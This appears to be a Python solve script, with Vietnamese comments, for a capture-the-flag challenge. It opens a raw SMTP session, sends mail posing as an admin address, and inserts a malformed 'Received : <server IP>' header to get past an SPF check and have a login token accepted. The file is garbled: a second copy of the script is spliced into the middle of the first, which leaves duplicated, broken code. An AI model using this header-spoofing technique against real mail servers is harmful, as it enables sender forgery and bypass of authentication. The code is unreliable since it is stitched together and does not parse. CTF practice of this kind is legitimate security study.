import socket
import ssl
import time

# Cấu hình
TARGET_HOST = "chall.polygl0ts.ch"
TARGET_PORT = 587
# Lấy IP của server challenge để spoof (Đây là IP sẽ vượt qua SPF)
SPOOFED_IP = socket.gethostbyname(TARGET_HOST) 

# Thay token bạn nhận được từ trang web vào đây
TOKEN = "LyVxQR0PBjPgAGRCgMcLWg" 

def solve():
    print(f"[*] Target IP for Spoofing: {SPOOFED_IP}")
    
    # Kết nối đến SMTP serverimport socket
import ssl

TARGET_HOST = "chall.polygl0ts.ch"
TARGET_PORT = 587 # Thử 587
TOKEN = "LyVxQR0PBjPgAGRCgMcLWg" # <--- Nhớ thay token mới

def solve():
    print(f"[*] Connecting to {TARGET_HOST}:{TARGET_PORT}...")
    try:
        # Tạo socket thường
        s = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)
        print("[+] Connected!")
        
        # Nhận banner ban đầu
        print(s.recv(1024).decode())

        def send_cmd(cmd):
            print(f"> {cmd}")
            s.send(f"{cmd}\r\n".encode())
            response = s.recv(1024).decode()
            print(response)
            return response

        send_cmd("EHLO admin")
        
        # Một số server yêu cầu STARTTLS ở port 587
        # Nếu server trả về "250-STARTTLS" thì uncomment đoạn dưới:
        # send_cmd("STARTTLS")
        # context = ssl.create_default_context()
        # s = context.wrap_socket(s, server_hostname=TARGET_HOST)
        
        send_cmd("MAIL FROM:<admin@auth.ctf.cx>")
        send_cmd("RCPT TO:<magic@auth.ctf.cx>")
        send_cmd("DATA")
        
        # IP của server challenge (để bypass SPF)
        # Bạn có thể ping chall.polygl0ts.ch để lấy IP điền cứng vào đây nếu lệnh gethostbyname bị sai
        spoofed_ip = socket.gethostbyname(TARGET_HOST) 
        
        email_content = [
            f"Subject: login:{TOKEN}",
            f"From: admin@auth.ctf.cx",
            f"To: magic@auth.ctf.cx",
            f"Received : {spoofed_ip}",  # Payload quan trọng
            "",
            "Please give me the flag",
            "."
        ]
        
        payload = "\r\n".join(email_content)
        send_cmd(payload)
        send_cmd("QUIT")
        s.close()
        print("[*] Done. Check the website!")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    solve()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    
    # Nhận banner
    print(s.recv(1024).decode())
    
    # Gửi lệnh SMTP thủ công
    def send_cmd(cmd):
        print(f"> {cmd}")
        s.send(f"{cmd}\r\n".encode())
        print(s.recv(1024).decode())

    send_cmd("EHLO admin")
    send_cmd("MAIL FROM:<admin@auth.ctf.cx>")
    send_cmd("RCPT TO:<magic@auth.ctf.cx>")
    send_cmd("DATA")
    
    # Payload Email
    # Lưu ý: "Received : " (có dấu cách trước dấu :)
    email_content = [
        f"Subject: login:{TOKEN}",
        f"From: admin@auth.ctf.cx",
        f"To: magic@auth.ctf.cx",
        f"Received : {SPOOFED_IP}", 
        "",
        "Body content here",
        "."
    ]
    
    payload = "\r\n".join(email_content)
    send_cmd(payload)
    
    send_cmd("QUIT")
    s.close()
    print("[*] Email sent! Check the website.")

if __name__ == "__main__":
    solve()